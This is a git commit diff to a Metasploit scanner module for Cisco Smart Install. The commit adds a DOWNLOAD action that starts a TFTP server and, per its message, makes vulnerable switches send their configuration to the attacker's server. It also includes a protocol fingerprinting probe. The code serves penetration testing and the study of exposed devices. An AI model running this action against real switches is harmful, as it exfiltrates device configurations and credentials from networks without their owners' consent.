feb24efd27bda8f3170b63aa1af309b347e25d33
Austin <30811388+realoriginal@users.noreply.github.com>
2017-11-16 12:58:54 -0500

    add DOWNLOAD action
    Adds DOWNLOAD function, to download config and send to attacker TFTP server.

--- modules/auxiliary/scanner/misc/cisco_smart_install.rb
+++ modules/auxiliary/scanner/misc/cisco_smart_install.rb
@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Cisco
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
@@ -18,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
           and determines if it speaks the Smart Install Protocol.  Exposure of SMI
           to untrusted networks can allow complete compromise of the switch.
         ),
-        'Author'         => ['Jon Hart <jon_hart[at]rapid7.com>', 'Mumbai'],
+        'Author'         => 'Jon Hart <jon_hart[at]rapid7.com>',
         'References'     =>
           [
             ['URL', 'https://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],
@@ -46,24 +47,6 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # thanks to https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py#L52-L53
-  SMI_PROBE = "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00".freeze
-  SMI_RE = /^\x00{3}\x04\x00{7}\x03\x00{3}\x08\x00{3}\x01\x00{4}$/
-  def smi?
-    sock.puts(SMI_PROBE)
-    response = sock.get_once(-1)
-    if response
-      if SMI_RE.match?(response)
-        print_good("Fingerprinted the Cisco Smart Install protocol")
-        return true
-      else
-        vprint_status("No match for '#{response}'")
-      end
-    else
-      vprint_status("No response")
-    end
-  end
-  
   def start_tftp
     print_status("Starting TFTP Server...")
     @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
@@ -131,6 +114,24 @@ class MetasploitModule < Msf::Auxiliary
   end
 
 
+  # thanks to https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py#L52-L53
+  SMI_PROBE = "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00".freeze
+  SMI_RE = /^\x00{3}\x04\x00{7}\x03\x00{3}\x08\x00{3}\x01\x00{4}$/
+  def smi?
+    sock.puts(SMI_PROBE)
+    response = sock.get_once(-1)
+    if response
+      if SMI_RE.match?(response)
+        print_good("Fingerprinted the Cisco Smart Install protocol")
+        return true
+      else
+        vprint_status("No match for '#{response}'")
+      end
+    else
+      vprint_status("No response")
+    end
+  end
+
   def run_host(ip)
     @lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)
     begin
@@ -138,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
         when action.name == 'SCAN'
           connect
           return unless smi?
-        when action.name == 'CONFIG'
+        when action.name == 'DOWNLOAD'
           start_tftp
           connect
           packet = craft_packet
